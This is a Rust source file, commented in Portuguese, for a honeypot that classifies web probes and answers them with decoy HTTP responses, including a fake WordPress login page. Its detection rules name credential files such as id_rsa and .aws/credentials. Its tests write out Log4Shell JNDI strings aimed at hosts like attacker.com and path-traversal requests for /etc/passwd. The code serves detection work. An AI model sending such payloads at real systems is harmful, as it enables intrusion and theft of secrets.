use chrono::Utc;
use serde::{Deserialize, Serialize};

/// Identifica a categoria de sondagem ou vetor de exploração web detetado.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ProbeType {
    EnvConfigHarvesting,
    WordPressScanner,
    Log4ShellProbe,
    PathTraversal,
    AdminPanelDiscovery,
}

impl ProbeType {
    /// Nome descritivo da categoria de sondagem.
    pub fn as_str(&self) -> &'static str {
        match self {
            ProbeType::EnvConfigHarvesting => "Env/Config Harvesting",
            ProbeType::WordPressScanner => "WordPress Scanner",
            ProbeType::Log4ShellProbe => "Log4Shell (CVE-2021-44228)",
            ProbeType::PathTraversal => "Path Traversal / LFI",
            ProbeType::AdminPanelDiscovery => "Admin Panel Discovery",
        }
    }

    /// Nível de severidade do incidente de segurança associado.
    #[allow(dead_code)]
    pub fn severity(&self) -> &'static str {
        match self {
            ProbeType::Log4ShellProbe => "CRÍTICO",
            ProbeType::PathTraversal => "CRÍTICO",
            ProbeType::EnvConfigHarvesting => "ALERTA",
            ProbeType::AdminPanelDiscovery => "ALERTA",
            ProbeType::WordPressScanner => "MÉDIO",
        }
    }

    /// Mapeamento da tática/técnica correspondente na matriz MITRE ATT&CK.
    #[allow(dead_code)]
    pub fn mitre_technique(&self) -> &'static str {
        match self {
            ProbeType::EnvConfigHarvesting => "T1552.001 - Unsecured Credentials: Credentials In Files",
            ProbeType::WordPressScanner => "T1190 - Exploit Public-Facing Application",
            ProbeType::Log4ShellProbe => "T1190 / T1059 - Command and Scripting Interpreter",
            ProbeType::PathTraversal => "T1083 - File and Directory Discovery / Path Traversal",
            ProbeType::AdminPanelDiscovery => "T1087 - Account Discovery / Admin Interface Discovery",
        }
    }
}

impl std::fmt::Display for ProbeType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.as_str())
    }
}

/// Detetor e classificador de sondagens e explorações web automatizadas.
#[derive(Debug, Default, Clone, Copy)]
pub struct WebProbeDetector;

impl WebProbeDetector {
    /// Classifica um URI / caminho HTTP devolvendo o tipo de exploração ou sondagem detetada.
    pub fn classify_uri(uri: &str) -> Option<ProbeType> {
        let raw_lower = uri.to_ascii_lowercase();
        let decoded = url_decode(&raw_lower);

        // 1. Log4Shell / JNDI Injection probe (CVE-2021-44228)
        if raw_lower.contains("jndi:")
            || decoded.contains("jndi:")
            || raw_lower.contains("${jndi")
            || decoded.contains("${jndi")
            || raw_lower.contains("${lower:")
            || raw_lower.contains("${upper:")
        {
            return Some(ProbeType::Log4ShellProbe);
        }

        // 2. Path Traversal / LFI (Local File Inclusion)
        if decoded.contains("../..")
            || decoded.contains("..\\..")
            || raw_lower.contains("../..")
            || raw_lower.contains("..%2f")
            || raw_lower.contains("%2e%2e")
            || decoded.contains("/etc/passwd")
            || raw_lower.contains("/etc/passwd")
            || decoded.contains("/etc/shadow")
            || raw_lower.contains("/etc/shadow")
            || decoded.contains("win.ini")
            || raw_lower.contains("win.ini")
            || decoded.contains("boot.ini")
            || decoded.contains("c:/windows")
            || decoded.contains("c:\\windows")
        {
            return Some(ProbeType::PathTraversal);
        }

        // 3. Env / Config Harvesting (.env, .git/config, config.php.bak, credenciais e backups)
        if is_env_config_probe(&raw_lower, &decoded) {
            return Some(ProbeType::EnvConfigHarvesting);
        }

        // 4. WordPress Scanners (/wp-login.php, /xmlrpc.php, /wp-admin/, /wp-content/)
        if is_wordpress_probe(&raw_lower, &decoded) {
            return Some(ProbeType::WordPressScanner);
        }

        // 5. Admin Panel / Interface Discovery (/phpmyadmin, /actuator/health, /swagger-ui)
        if is_admin_panel_probe(&raw_lower, &decoded) {
            return Some(ProbeType::AdminPanelDiscovery);
        }

        None
    }

    /// Inspeciona um payload bruto de bytes HTTP (requisição completa, linha de pedido, cabeçalhos ou corpo)
    /// e devolve o tipo de ataque ou sondagem detetada.
    pub fn inspect_payload(payload: &[u8]) -> Option<ProbeType> {
        if payload.is_empty() {
            return None;
        }

        // Tenta primeiro extrair o URI do pedido HTTP se estiver estruturado
        if let Some(uri) = extract_http_uri(payload) {
            if let Some(probe) = Self::classify_uri(&uri) {
                return Some(probe);
            }
        }

        // Inspeciona o payload global (cabeçalhos, parâmetros de consulta, corpo)
        let text = String::from_utf8_lossy(payload);
        let text_lower = text.to_ascii_lowercase();
        let decoded = url_decode(&text_lower);

        // 1. Log4Shell no corpo ou cabeçalhos (ex.: User-Agent, X-Api-Version)
        if text_lower.contains("jndi:")
            || decoded.contains("jndi:")
            || text_lower.contains("${jndi")
            || decoded.contains("${jndi")
            || text_lower.contains("${lower:")
            || text_lower.contains("${upper:")
        {
            return Some(ProbeType::Log4ShellProbe);
        }

        // 2. Path Traversal em campos de formulário, multipart ou URLs
        if decoded.contains("../..")
            || decoded.contains("..\\..")
            || text_lower.contains("../..")
            || text_lower.contains("..%2f")
            || text_lower.contains("%2e%2e")
            || decoded.contains("/etc/passwd")
            || text_lower.contains("/etc/passwd")
            || decoded.contains("/etc/shadow")
            || text_lower.contains("/etc/shadow")
            || decoded.contains("win.ini")
            || text_lower.contains("win.ini")
        {
            return Some(ProbeType::PathTraversal);
        }

        // 3. Env / Config Harvesting
        if is_env_config_probe(&text_lower, &decoded) {
            return Some(ProbeType::EnvConfigHarvesting);
        }

        // 4. WordPress Scanners e chamadas XML-RPC
        if is_wordpress_probe(&text_lower, &decoded) || decoded.contains("system.multicall") {
            return Some(ProbeType::WordPressScanner);
        }

        // 5. Admin Panel / Endpoints de diagnóstico
        if is_admin_panel_probe(&text_lower, &decoded) {
            return Some(ProbeType::AdminPanelDiscovery);
        }

        None
    }

    /// Gera uma resposta decoy autêntica (404, 401 ou HTML de login falso) adaptada à sondagem detetada.
    pub fn generate_decoy_response(probe: &ProbeType) -> Vec<u8> {
        let date_header = http_date_now();

        match probe {
            ProbeType::EnvConfigHarvesting => {
                // Resposta Nginx 404 autêntica para ficheiros ocultos ou de configuração inexistentes
                let body = "<!DOCTYPE html>\n\
                <html>\n\
                <head><title>404 Not Found</title></head>\n\
                <body>\n\
                <center><h1>404 Not Found</h1></center>\n\
                <hr><center>nginx/1.24.0</center>\n\
                </body>\n\
                </html>\n";

                format!(
                    "HTTP/1.1 404 Not Found\r\n\
                     Server: nginx/1.24.0\r\n\
                     Date: {}\r\n\
                     Content-Type: text/html; charset=UTF-8\r\n\
                     Content-Length: {}\r\n\
                     Connection: close\r\n\
                     \r\n\
                     {}",
                    date_header,
                    body.len(),
                    body
                )
                .into_bytes()
            }

            ProbeType::WordPressScanner => {
                // Formulário de login simulado do WordPress para prender bots e capturar credenciais
                let body = "<!DOCTYPE html>\n\
                <html lang=\"en-US\">\n\
                <head>\n\
                \t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n\
                \t<title>Log In &lsaquo; WordPress Site &#8212; WordPress</title>\n\
                \t<meta name='robots' content='max-image-preview:large, noindex, noarchive' />\n\
                \t<link rel='stylesheet' id='login-css' href='/wp-admin/css/login.min.css' type='text/css' media='all' />\n\
                </head>\n\
                <body class=\"login wp-core-ui locale-en-us\">\n\
                <div id=\"login\">\n\
                \t<h1><a href=\"https://wordpress.org/\">Powered by WordPress</a></h1>\n\
                \t<form name=\"loginform\" id=\"loginform\" action=\"/wp-login.php\" method=\"post\">\n\
                \t\t<p>\n\
                \t\t\t<label for=\"user_login\">Username or Email Address</label>\n\
                \t\t\t<input type=\"text\" name=\"log\" id=\"user_login\" class=\"input\" value=\"\" size=\"20\" autocapitalize=\"off\" autocomplete=\"username\" />\n\
                \t\t</p>\n\
                \t\t<div class=\"user-pass-wrap\">\n\
                \t\t\t<label for=\"user_pass\">Password</label>\n\
                \t\t\t<div class=\"wp-pwd\">\n\
                \t\t\t\t<input type=\"password\" name=\"pwd\" id=\"user_pass\" class=\"input password-input\" value=\"\" size=\"20\" autocomplete=\"current-password\" />\n\
                \t\t\t</div>\n\
                \t\t</div>\n\
                \t\t<p class=\"forgetmenot\"><input name=\"rememberme\" type=\"checkbox\" id=\"rememberme\" value=\"forever\" /> <label for=\"rememberme\">Remember Me</label></p>\n\
                \t\t<p class=\"submit\">\n\
                \t\t\t<input type=\"submit\" name=\"wp-submit\" id=\"wp-submit\" class=\"button button-primary button-large\" value=\"Log In\" />\n\
                \t\t</p>\n\
                \t</form>\n\
                </div>\n\
                </body>\n\
                </html>\n";

                format!(
                    "HTTP/1.1 200 OK\r\n\
                     Server: Apache/2.4.52 (Ubuntu)\r\n\
                     Date: {}\r\n\
                     Content-Type: text/html; charset=UTF-8\r\n\
                     Content-Length: {}\r\n\
                     Connection: close\r\n\
                     \r\n\
                     {}",
                    date_header,
                    body.len(),
                    body
                )
                .into_bytes()
            }

            ProbeType::Log4ShellProbe => {
                // Resposta simulada de backend Java / Apache Tomcat indicando erro de sintaxe
                let body = "<!doctype html><html lang=\"en\"><head><title>HTTP Status 400 – Bad Request</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} hr {color:#525D76;}</style></head><body><h1>HTTP Status 400 – Bad Request</h1><hr class=\"line\" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the request target or header value.</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error.</p><hr class=\"line\" /><h3>Apache Tomcat/9.0.58</h3></body></html>";

                format!(
                    "HTTP/1.1 400 Bad Request\r\n\
                     Server: Apache-Coyote/1.1\r\n\
                     Date: {}\r\n\
                     Content-Type: text/html;charset=utf-8\r\n\
                     Content-Length: {}\r\n\
                     Connection: close\r\n\
                     \r\n\
                     {}",
                    date_header,
                    body.len(),
                    body
                )
                .into_bytes()
            }

            ProbeType::PathTraversal => {
                // Resposta 403 Forbidden simulando bloqueio por política de segurança / WAF
                let body = "<!DOCTYPE html>\n\
                <html>\n\
                <head><title>403 Forbidden</title></head>\n\
                <body>\n\
                <center><h1>403 Forbidden</h1></center>\n\
                <hr><center>nginx/1.24.0</center>\n\
                </body>\n\
                </html>\n";

                format!(
                    "HTTP/1.1 403 Forbidden\r\n\
                     Server: nginx/1.24.0\r\n\
                     Date: {}\r\n\
                     Content-Type: text/html; charset=UTF-8\r\n\
                     Content-Length: {}\r\n\
                     Connection: close\r\n\
                     \r\n\
                     {}",
                    date_header,
                    body.len(),
                    body
                )
                .into_bytes()
            }

            ProbeType::AdminPanelDiscovery => {
                // Resposta 401 Unauthorized com cabeçalho WWW-Authenticate realista
                let body = "<!DOCTYPE html>\n\
                <html>\n\
                <head><title>401 Authorization Required</title></head>\n\
                <body>\n\
                <center><h1>401 Authorization Required</h1></center>\n\
                <hr><center>nginx/1.24.0</center>\n\
                </body>\n\
                </html>\n";

                format!(
                    "HTTP/1.1 401 Unauthorized\r\n\
                     Server: nginx/1.24.0\r\n\
                     Date: {}\r\n\
                     WWW-Authenticate: Basic realm=\"Restricted Administrative Console\"\r\n\
                     Content-Type: text/html; charset=UTF-8\r\n\
                     Content-Length: {}\r\n\
                     Connection: close\r\n\
                     \r\n\
                     {}",
                    date_header,
                    body.len(),
                    body
                )
                .into_bytes()
            }
        }
    }
}

/// Formata a data atual no formato HTTP RFC 1123 / RFC 7231 (ex.: Fri, 13 Nov 2026 10:45:00 GMT).
fn http_date_now() -> String {
    Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string()
}

/// Extrai o URI de uma linha de requisição HTTP (ex.: "GET /index.php HTTP/1.1").
fn extract_http_uri(payload: &[u8]) -> Option<String> {
    let mut parts = payload.split(|&b| b == b' ');
    let method = parts.next()?;
    match method {
        b"GET" | b"POST" | b"HEAD" | b"PUT" | b"DELETE" | b"OPTIONS" | b"CONNECT" | b"TRACE"
        | b"PATCH" => {}
        _ => return None,
    }
    let uri_bytes = parts.next()?;
    std::str::from_utf8(uri_bytes).ok().map(|s| s.to_string())
}

/// Decodifica caracteres codificados em formato percentual (%xx) e decodificação secundária contra evasões.
pub fn url_decode(s: &str) -> String {
    let mut decoded = String::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(hex_str) = std::str::from_utf8(&bytes[i + 1..i + 3]) {
                if let Ok(byte) = u8::from_str_radix(hex_str, 16) {
                    decoded.push(byte as char);
                    i += 3;
                    continue;
                }
            }
        } else if bytes[i] == b'+' {
            decoded.push(' ');
            i += 1;
            continue;
        }
        decoded.push(bytes[i] as char);
        i += 1;
    }

    // Passagem secundária para detectar ataques com dupla codificação (%252e%252e)
    if decoded.contains('%') && decoded != s {
        let mut pass2 = String::with_capacity(decoded.len());
        let dbytes = decoded.as_bytes();
        let mut j = 0;
        let mut modified = false;
        while j < dbytes.len() {
            if dbytes[j] == b'%' && j + 2 < dbytes.len() {
                if let Ok(hex_str) = std::str::from_utf8(&dbytes[j + 1..j + 3]) {
                    if let Ok(b) = u8::from_str_radix(hex_str, 16) {
                        pass2.push(b as char);
                        j += 3;
                        modified = true;
                        continue;
                    }
                }
            }
            pass2.push(dbytes[j] as char);
            j += 1;
        }
        if modified {
            return pass2;
        }
    }

    decoded
}

/// Verifica se a string corresponde a padrões de colheita de ficheiros de ambiente ou configuração.
fn is_env_config_probe(raw: &str, decoded: &str) -> bool {
    let check = |s: &str| {
        s.contains("/.env")
            || s.ends_with(".env")
            || s.contains(".env.")
            || s.contains(".env/")
            || s.contains("/.git/config")
            || s.contains(".git/config")
            || s.contains("/.git/head")
            || s.contains(".git/head")
            || s.contains("/.git/")
            || s.contains("config.php.bak")
            || s.contains("wp-config.php.bak")
            || s.contains("configuration.php.bak")
            || s.contains("config.inc.php.bak")
            || s.contains("settings.py.bak")
            || s.contains("web.config.bak")
            || s.contains(".aws/credentials")
            || s.contains(".aws/config")
            || s.contains("id_rsa")
            || s.contains("id_ed25519")
            || s.contains(".bash_history")
            || s.contains("database.sqlite")
            || s.contains("backup.sql")
            || s.contains("dump.sql")
    };

    check(raw) || check(decoded)
}

/// Verifica se a string corresponde a sondagens típicas do WordPress.
fn is_wordpress_probe(raw: &str, decoded: &str) -> bool {
    let check = |s: &str| {
        s.contains("/wp-login.php")
            || s.contains("wp-login.php")
            || s.contains("/xmlrpc.php")
            || s.contains("xmlrpc.php")
            || s.contains("/wp-admin/")
            || s.contains("/wp-admin")
            || s.contains("/wp-includes/")
            || s.contains("/wp-content/")
            || s.contains("/wp-json/wp/")
            || s.contains("/wp-cron.php")
    };

    check(raw) || check(decoded)
}

/// Verifica se a string corresponde a descoberta de painéis de administração ou diagnósticos.
fn is_admin_panel_probe(raw: &str, decoded: &str) -> bool {
    let check = |s: &str| {
        s.contains("/phpmyadmin")
            || s.contains("phpmyadmin")
            || s.contains("/pma/")
            || s.contains("/pma")
            || s.contains("/adminer.php")
            || s.contains("adminer.php")
            || s.contains("/actuator/health")
            || s.contains("actuator/health")
            || s.contains("/actuator/env")
            || s.contains("/actuator")
            || s.contains("/swagger-ui")
            || s.contains("swagger-ui")
            || s.contains("/swagger-ui.html")
            || s.contains("/api-docs")
            || s.contains("/openapi.json")
            || s.contains("/cpanel")
            || s.contains("/manager/html")
    };

    check(raw) || check(decoded)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_env_harvesting_detection() {
        // Testes de deteção direta via classify_uri
        assert_eq!(
            WebProbeDetector::classify_uri("/.env"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/.env.local"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/api/.env.production"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/.git/config"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("config.php.bak"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/wp-config.php.bak"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/backup.sql"),
            Some(ProbeType::EnvConfigHarvesting)
        );

        // Testes com URL encoding
        assert_eq!(
            WebProbeDetector::classify_uri("/%2e%65%6e%76"),
            Some(ProbeType::EnvConfigHarvesting)
        );

        // Testes via inspect_payload
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /.env HTTP/1.1\r\nHost: example.com\r\n\r\n"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /.git/config HTTP/1.1\r\n\r\n"),
            Some(ProbeType::EnvConfigHarvesting)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /config.php.bak HTTP/1.1\r\n\r\n"),
            Some(ProbeType::EnvConfigHarvesting)
        );
    }

    #[test]
    fn test_wordpress_probe() {
        // Testes de deteção de sondagens WordPress via classify_uri
        assert_eq!(
            WebProbeDetector::classify_uri("/wp-login.php"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/xmlrpc.php"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/wp-admin/"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/blog/wp-login.php"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/wp-includes/wlwmanifest.xml"),
            Some(ProbeType::WordPressScanner)
        );

        // Testes via inspect_payload
        assert_eq!(
            WebProbeDetector::inspect_payload(b"POST /xmlrpc.php HTTP/1.1\r\nHost: target\r\n\r\n"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /wp-admin/install.php HTTP/1.1\r\n\r\n"),
            Some(ProbeType::WordPressScanner)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"<methodCall><methodName>system.multicall</methodName></methodCall>"),
            Some(ProbeType::WordPressScanner)
        );
    }

    #[test]
    fn test_log4shell_detection() {
        // Testes de deteção de injeção Log4Shell via classify_uri
        assert_eq!(
            WebProbeDetector::classify_uri("${jndi:ldap://192.168.1.100:1389/Exploit}"),
            Some(ProbeType::Log4ShellProbe)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/search?query=${jndi:ldap://attacker.com/payload}"),
            Some(ProbeType::Log4ShellProbe)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/test?x=${jndi:rmi://10.0.0.1:1099/obj}"),
            Some(ProbeType::Log4ShellProbe)
        );

        // Testes de cabeçalhos maliciosos via inspect_payload
        assert_eq!(
            WebProbeDetector::inspect_payload(
                b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://127.0.0.1:1389/a}\r\n\r\n"
            ),
            Some(ProbeType::Log4ShellProbe)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(
                b"GET /login HTTP/1.1\r\nX-Api-Version: ${jndi:dns://corp.dns/leak}\r\n\r\n"
            ),
            Some(ProbeType::Log4ShellProbe)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"${jndi:ldap://10.10.10.10:1389/o}"),
            Some(ProbeType::Log4ShellProbe)
        );
    }

    #[test]
    fn test_path_traversal() {
        // Testes de deteção de Path Traversal via classify_uri
        assert_eq!(
            WebProbeDetector::classify_uri("../.."),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("win.ini"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/etc/passwd"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/index.php?file=../../../../etc/passwd"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/download?path=..%2f..%2fwindows%2fwin.ini"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/download?path=%2e%2e%2f%2e%2e%2fetc%2fshadow"),
            Some(ProbeType::PathTraversal)
        );

        // Testes via inspect_payload
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /../../etc/passwd HTTP/1.1\r\n\r\n"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /view?doc=win.ini HTTP/1.1\r\n\r\n"),
            Some(ProbeType::PathTraversal)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"POST /api/read HTTP/1.1\r\n\r\nfilename=../../../../etc/passwd"),
            Some(ProbeType::PathTraversal)
        );
    }

    #[test]
    fn test_decoy_response_not_empty() {
        let probe_types = [
            ProbeType::EnvConfigHarvesting,
            ProbeType::WordPressScanner,
            ProbeType::Log4ShellProbe,
            ProbeType::PathTraversal,
            ProbeType::AdminPanelDiscovery,
        ];

        for probe in &probe_types {
            let response = WebProbeDetector::generate_decoy_response(probe);
            assert!(
                !response.is_empty(),
                "A resposta decoy para {:?} não deve estar vazia",
                probe
            );

            let resp_str = std::str::from_utf8(&response)
                .expect("A resposta decoy gerada deve ser UTF-8 válido");

            assert!(
                resp_str.starts_with("HTTP/1.1 "),
                "A resposta deve ser uma linha de estado HTTP válida"
            );
            assert!(
                resp_str.contains("Content-Length: "),
                "A resposta HTTP deve conter o cabeçalho Content-Length"
            );
            assert!(
                resp_str.contains("\r\n\r\n"),
                "A resposta HTTP deve delimitar cabeçalhos do corpo com CRLFCRLF"
            );

            match probe {
                ProbeType::EnvConfigHarvesting => {
                    assert!(resp_str.contains("404 Not Found"));
                }
                ProbeType::WordPressScanner => {
                    assert!(resp_str.contains("wp-login.php") || resp_str.contains("WordPress"));
                }
                ProbeType::Log4ShellProbe => {
                    assert!(resp_str.contains("400 Bad Request") && resp_str.contains("Tomcat"));
                }
                ProbeType::PathTraversal => {
                    assert!(resp_str.contains("403 Forbidden"));
                }
                ProbeType::AdminPanelDiscovery => {
                    assert!(resp_str.contains("401 Unauthorized") && resp_str.contains("WWW-Authenticate"));
                }
            }
        }
    }

    #[test]
    fn test_admin_panel_discovery() {
        assert_eq!(
            WebProbeDetector::classify_uri("/phpmyadmin"),
            Some(ProbeType::AdminPanelDiscovery)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/actuator/health"),
            Some(ProbeType::AdminPanelDiscovery)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/swagger-ui"),
            Some(ProbeType::AdminPanelDiscovery)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/swagger-ui.html"),
            Some(ProbeType::AdminPanelDiscovery)
        );
        assert_eq!(
            WebProbeDetector::classify_uri("/api-docs"),
            Some(ProbeType::AdminPanelDiscovery)
        );

        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /phpmyadmin/index.php HTTP/1.1\r\n\r\n"),
            Some(ProbeType::AdminPanelDiscovery)
        );
        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /actuator/health HTTP/1.1\r\n\r\n"),
            Some(ProbeType::AdminPanelDiscovery)
        );
    }

    #[test]
    fn test_benign_traffic_ignored() {
        assert_eq!(WebProbeDetector::classify_uri("/"), None);
        assert_eq!(WebProbeDetector::classify_uri("/index.html"), None);
        assert_eq!(WebProbeDetector::classify_uri("/about"), None);
        assert_eq!(WebProbeDetector::classify_uri("/static/css/main.css"), None);
        assert_eq!(WebProbeDetector::classify_uri("/api/v1/users/42"), None);

        assert_eq!(
            WebProbeDetector::inspect_payload(b"GET /index.html HTTP/1.1\r\nHost: test.com\r\n\r\n"),
            None
        );
        assert_eq!(WebProbeDetector::inspect_payload(b"PING\r\n"), None);
        assert_eq!(WebProbeDetector::inspect_payload(b""), None);
    }

    #[test]
    fn test_probe_type_metadata() {
        let env_probe = ProbeType::EnvConfigHarvesting;
        assert_eq!(env_probe.as_str(), "Env/Config Harvesting");
        assert_eq!(env_probe.severity(), "ALERTA");
        assert!(env_probe.mitre_technique().starts_with("T1552"));
        assert_eq!(format!("{}", env_probe), "Env/Config Harvesting");

        let log4j = ProbeType::Log4ShellProbe;
        assert_eq!(log4j.severity(), "CRÍTICO");
        assert!(log4j.mitre_technique().contains("T1190"));

        let traversal = ProbeType::PathTraversal;
        assert_eq!(traversal.severity(), "CRÍTICO");

        let wp = ProbeType::WordPressScanner;
        assert_eq!(wp.severity(), "MÉDIO");

        let admin = ProbeType::AdminPanelDiscovery;
        assert_eq!(admin.severity(), "ALERTA");
    }

    #[test]
    fn test_url_decoding_variants() {
        assert_eq!(url_decode("hello%20world"), "hello world");
        assert_eq!(url_decode("path%2Fto%2Ffile"), "path/to/file");
        // Dupla codificação: %252e -> %2e -> .
        assert_eq!(url_decode("%252e%252e%252f"), "../");
    }
}
